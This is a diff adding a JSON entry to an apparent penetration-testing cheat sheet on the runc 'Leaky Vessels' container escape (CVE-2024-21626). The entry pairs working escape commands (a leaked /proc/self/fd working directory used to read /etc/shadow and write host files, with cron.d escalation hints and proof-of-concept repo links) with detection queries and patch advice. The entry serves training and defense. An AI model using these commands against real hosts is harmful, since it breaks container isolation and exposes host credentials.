@@ -1,0 +1,106 @@
+{
+  "id": "linux-runc-leaky-vessels",
+  "name": "Leaky Vessels runc/containerd container escape (CVE-2024-21626)",
+  "command": "docker run -w /proc/self/fd/<n> <image>   # runc leaked-fd cwd escape to host",
+  "description": "CVE-2024-21626 (Leaky Vessels) is a container-escape bug in runc <=1.1.11 (used by Docker, containerd, CRI-O, Kubernetes). runc leaks an open file descriptor pointing at the host filesystem (an ancestor of the container's working directory). By setting the container WORKDIR (or process.cwd) to /proc/self/fd/<n>, a process inside the container resolves paths relative to the host root, allowing read/write of host files and full escape to the host as root. A build-time variant abuses the same leak via a crafted Dockerfile WORKDIR.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Container Escape",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "Snyk / Leaky Vessels / CVE-2024-21626",
+  "tags": [
+    "cve-2024-21626",
+    "leaky-vessels",
+    "runc",
+    "containerd",
+    "docker",
+    "container-escape"
+  ],
+  "mitre": [
+    "T1611",
+    "T1068"
+  ],
+  "exam": "lab-only",
+  "notes": "=== WHAT IT IS ===\n  runc leaves a file descriptor open to the host filesystem when it sets up the\n  container. If the container's working directory is set to that leaked fd via\n  /proc/self/fd/<n>, the container process operates on the HOST filesystem (outside\n  the container root), giving read/write to host files as root -> full escape.\n\n=== AFFECTED ===\n  runc <= 1.1.11 (fixed in 1.1.12). Pulls in Docker Engine < 25.0.2 /\n  containerd < 1.6.28 / 1.7.13, CRI-O, and Kubernetes nodes using them.\n  docker --version ; runc --version ; containerd --version\n\n=== RUNTIME VARIANT (run with attacker-chosen WORKDIR) ===\n  # The leaked fd number varies (commonly 7-9). Point cwd at it and read/write host:\n  docker run --rm -w /proc/self/fd/8 <image> \\\n    bash -c 'cat /etc/shadow; echo PWNED > /host_file'\n  # Writing to ../../../../etc/cron.d/x or a host SUID path escalates on the host.\n\n=== BUILD VARIANT (malicious Dockerfile) ===\n  # In a Dockerfile:  WORKDIR /proc/self/fd/8  then RUN a command that touches the\n  # host filesystem during 'docker build'. PoC repos: snyk/leaky-vessels-dynamic-detector,\n  # NitroCao/CVE-2024-21626, Wall1e/CVE-2024-21626-POC.\n\n=== PoC REPOS ===\n  git clone https://github.com/NitroCao/CVE-2024-21626\n  # follow the repo: build the image, run with -w /proc/self/fd/<n>, confirm host access.\n\n=== ALTERNATIVES ===\n  cgroup release_agent escape; docker-socket abuse; --privileged container escape",
+  "examples": [
+    {
+      "label": "Check runtime versions for the vulnerable range",
+      "command": "docker --version; runc --version; containerd --version"
+    },
+    {
+      "label": "Escape at runtime via a leaked-fd working directory",
+      "command": "docker run --rm -w /proc/self/fd/8 <image> bash -c 'ls -la /; cat /etc/shadow'"
+    },
+    {
+      "label": "Write a host file to confirm the escape",
+      "command": "docker run --rm -w /proc/self/fd/8 <image> bash -c 'echo pwn > ../../../../tmp/escape_proof'"
+    }
+  ],
+  "references": [
+    {
+      "title": "NVD - CVE-2024-21626",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21626"
+    },
+    {
+      "title": "Snyk - Leaky Vessels disclosure",
+      "url": "https://snyk.io/blog/cve-2024-21626-runc-process-cwd-container-breakout/"
+    },
+    {
+      "title": "PoC - NitroCao/CVE-2024-21626",
+      "url": "https://github.com/NitroCao/CVE-2024-21626"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "linux-docker-escape",
+      "note": "Broader Docker/container escape techniques.",
+      "rel": "alternative"
+    },
+    {
+      "id": "docker-socket-exposed",
+      "note": "Another container-to-host path when the socket is mounted.",
+      "rel": "alternative"
+    },
+    {
+      "id": "linux-cgroup-release-agent-escape",
+      "note": "cgroup release_agent escape as a sibling technique.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "During container setup runc keeps a file descriptor open to a directory on the host filesystem and does not close it before handing control to the container process. Because /proc/self/fd/<n> dereferences to that host directory, a container that sets its working directory (process.cwd) to the leaked fd resolves relative paths against the host root, escaping the container mount namespace with the container's (often root) privileges.",
+    "prerequisites": "The ability to run a container (or submit an image/Dockerfile to a build) on a host using runc <=1.1.11 / Docker <25.0.2 / containerd <1.6.28 or <1.7.13. No host credentials needed - just control of a container's WORKDIR/cwd or build steps.",
+    "impact": "Full container-to-host escape with read/write of host files as root, defeating the container boundary - critical in multi-tenant Docker/Kubernetes and CI build environments.",
+    "detection": "[MITRE T1611] Containers whose working directory or process cwd is set to /proc/self/fd/<n>; container processes accessing host paths via a /proc/self/fd symlink; docker run -w /proc/self/fd/... or a Dockerfile WORKDIR under /proc/self/fd; unexpected host-filesystem writes originating from a container runtime.",
+    "artifacts": "auditd/EDR records of a container process opening paths under /proc/self/fd that resolve outside the container rootfs; docker/containerd logs showing an unusual WORKDIR; host files modified with a container runtime as the writer; runc debug logs.",
+    "splunk_spl": "index=linux (sourcetype=\"linux:auditd\" OR sourcetype=docker)\n| search (proctitle=\"*/proc/self/fd/*\" OR ProcessCommandLine=\"*-w /proc/self/fd/*\" OR CONTAINER_WORKDIR=\"*/proc/self/fd/*\")\n| table _time, host, exe, proctitle",
+    "elastic_kql": "process.args:*\\/proc\\/self\\/fd\\/* and (process.name:runc or container.runtime:* or process.args:*\\-w*)",
+    "sentinel_kql": "DeviceProcessEvents\n| where ProcessCommandLine has \"/proc/self/fd/\" and (ProcessCommandLine has \"-w \" or ProcessCommandLine has \"WORKDIR\" or InitiatingProcessFileName in (\"runc\",\"containerd-shim\",\"dockerd\"))\n| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine\n// container cwd set to a leaked host fd (CVE-2024-21626)",
+    "sigma_rules": "lnx_runc_leaked_fd_cwd_escape (container WORKDIR/cwd pointing at /proc/self/fd/<n>)",
+    "prevention": "Upgrade runc to 1.1.12+ and the bundled Docker (25.0.2+) / containerd (1.6.28+/1.7.13+) / CRI-O. Scan images and Dockerfiles for WORKDIR under /proc/self/fd; restrict who can run containers or push build jobs; enable runtime detection for /proc/self/fd cwd and host-path access from containers.",
+    "sources": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-21626",
+      "https://snyk.io/blog/cve-2024-21626-runc-process-cwd-container-breakout/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Container cwd set to leaked host fd (Leaky Vessels)",
+        "logic": "DeviceProcessEvents\n| where ProcessCommandLine has \"/proc/self/fd/\"\n| where ProcessCommandLine has \"-w \" or ProcessCommandLine has \"WORKDIR\" or InitiatingProcessFileName in (\"runc\",\"containerd-shim\",\"dockerd\")\n| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine",
+        "data_source": "edr",
+        "attack": [
+          "T1611"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate use of /proc/self/fd as a container working directory is extremely rare.",
+        "tuning": "Alert on any container WORKDIR/cwd under /proc/self/fd; correlate with host-path file access by a container runtime."
+      }
+    ]
+  }
+}
